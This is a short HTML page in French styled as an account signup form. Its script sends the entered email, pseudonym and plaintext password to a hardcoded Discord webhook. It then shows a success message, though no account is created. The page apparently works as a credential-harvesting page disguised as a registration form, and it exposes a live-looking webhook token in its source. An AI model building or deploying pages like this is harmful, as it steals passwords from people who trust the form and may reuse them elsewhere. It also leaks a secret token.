<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Signup</title>
<style>
  body {
    background-color: #0b3d91;
    color: white;
    font-family: monospace;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  #signup {
    background-color: rgba(0,0,0,0.3);
    padding: 20px;
    border-radius: 8px;
  }
  input, button {
    width: 100%;
    padding: 8px;
    margin: 5px 0;
    border-radius: 4px;
    border: none;
  }
  button {
    background-color: #1a5fb4;
    color: white;
    cursor: pointer;
  }
  button:hover {
    background-color: #0a3d80;
  }
</style>
</head>
<body>

<div id="signup">
  <h2>Créer un compte</h2>
  <input id="email" type="email" placeholder="Email" required>
  <input id="username" type="text" placeholder="Pseudonyme" required>
  <input id="password" type="password" placeholder="Mot de passe" required>
  <button id="submit">Créer le compte</button>
</div>

<script>
  const webhookURL = "https://discord.com/api/webhooks/1406021613316735247/NTjoX6ln-ASDsg7-vIYGOV2bEhv2JatvfUHPnEh2qk66JnNDurSo6QaYpkb0ALqaRAwq"; 

  document.getElementById("submit").onclick = () => {
    const email = document.getElementById("email").value;
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    if(!email || !username || !password) {
      alert("Remplis tous les champs !");
      return;
    }

    const data = {
      content: `Nouveau signup
Email: ${email}
Pseudonyme: ${username}
Mot de passe: ${password}`
    };

    fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })
    .then(res => {
      if(res.ok) {
        alert("Compte creer !");
        document.getElementById("email").value = "";
        document.getElementById("username").value = "";
        document.getElementById("password").value = "";
      } else {
        alert("Erreur lors de l'envoi.");
      }
    })
    .catch(console.error);
  };
</script>

</body>
</html>
